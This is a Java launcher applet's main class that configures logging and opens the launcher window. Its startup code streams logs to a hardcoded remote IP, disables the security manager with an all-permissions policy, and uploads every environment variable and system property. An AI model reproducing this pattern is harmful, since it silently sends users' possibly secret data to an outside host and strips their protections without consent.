package com.timepath.launcher;

import com.timepath.launcher.ui.swing.LauncherFrame;
import com.timepath.launcher.util.IOUtils;
import com.timepath.launcher.util.JARUtils;
import com.timepath.launcher.util.SwingUtils;
import com.timepath.launcher.util.Utils;
import com.timepath.logging.LogAggregator;
import com.timepath.logging.LogFileHandler;
import com.timepath.logging.LogIOHandler;

import javax.swing.*;
import java.io.IOException;
import java.lang.management.ManagementFactory;
import java.security.*;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.logging.*;

/**
 * @author TimePath
 */
@SuppressWarnings("serial")
public class Main extends JApplet {

    private static final Logger LOG = Logger.getLogger(Main.class.getName());

    static {
        Thread.setDefaultUncaughtExceptionHandler(new Thread.UncaughtExceptionHandler() {
            @Override
            public void uncaughtException(Thread t, Throwable e) {
                Logger.getLogger(t.getName()).log(Level.SEVERE, "Uncaught Exception", e);
            }
        });
        Level consoleLevel = Level.CONFIG;
        try {
            consoleLevel = Level.parse(Utils.SETTINGS.get("consoleLevel", consoleLevel.getName()));
        } catch(IllegalArgumentException | NullPointerException ignore) {
        }
        Level logfileLevel = Level.CONFIG;
        try {
            logfileLevel = Level.parse(Utils.SETTINGS.get("logfileLevel", logfileLevel.getName()));
        } catch(IllegalArgumentException | NullPointerException ignore) {
        }
        // choose finest level
        Level packageLevel = Level.parse(Integer.toString(Math.min(logfileLevel.intValue(), consoleLevel.intValue())));
        Logger.getLogger("com.timepath").setLevel(packageLevel);
        Logger globalLogger = Logger.getLogger("");
        SimpleFormatter consoleFormatter = new SimpleFormatter();
        if(!consoleLevel.equals(Level.OFF)) {
            for(Handler h : globalLogger.getHandlers()) {
                if(h instanceof ConsoleHandler) {
                    h.setLevel(consoleLevel);
                    h.setFormatter(consoleFormatter);
                }
            }
        }
        if(!logfileLevel.equals(Level.OFF)) {
            LogAggregator lh = new LogAggregator();
            if(!Utils.DEBUG) {
                try {
                    lh.addHandler(new LogFileHandler());
                } catch(IOException | SecurityException ex) {
                    LOG.log(Level.SEVERE, null, ex);
                }
            }
            lh.addHandler(new LogIOHandler().connect("5.175.143.139", 28777));
            lh.setLevel(logfileLevel);
            globalLogger.addHandler(lh);
            LOG.log(Level.INFO, "Logger: {0}", lh);
        }
        LOG.log(Level.INFO, "Console level: {0}", consoleLevel);
        LOG.log(Level.INFO, "Logfile level: {0}", logfileLevel);
        LOG.log(Level.INFO, "Package level: {0}", packageLevel);
        Policy.setPolicy(new Policy() {
            @Override
            public PermissionCollection getPermissions(CodeSource codesource) {
                Permissions perms = new Permissions();
                perms.add(new AllPermission());
                return perms;
            }
        });
        System.setSecurityManager(null);
    }

    @Override
    public void init() {
        main(new String[0]);
    }

    @SuppressWarnings("MethodNamesDifferingOnlyByCase")
    public static void main(String[] args) {
        LOG.log(Level.INFO, "Initial: {0}ms", System.currentTimeMillis() - Utils.START_TIME);
        LOG.log(Level.INFO, "Args = {0}", Arrays.toString(args));
        IOUtils.checkForUpdate(args);
        Map<String, Object> dbg = new HashMap<>(3);
        dbg.put("name", ManagementFactory.getRuntimeMXBean().getName());
        dbg.put("env", System.getenv());
        dbg.put("properties", System.getProperties());
        String pprint = Utils.pprint(dbg);
        LOG.info(pprint);
        if(!Utils.DEBUG) {
            IOUtils.log(Utils.USER + ".xml.gz", "launcher/" + JARUtils.CURRENT_VERSION + "/connects", pprint);
        }
        LOG.log(Level.INFO, "Startup: {0}ms", System.currentTimeMillis() - Utils.START_TIME);
        final Launcher launcher = new Launcher();
        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                SwingUtils.lookAndFeel();
                new LauncherFrame(launcher).setVisible(true);
                LOG.log(Level.INFO, "Visible at {0}ms", System.currentTimeMillis() - Utils.START_TIME);
            }
        });
    }
}
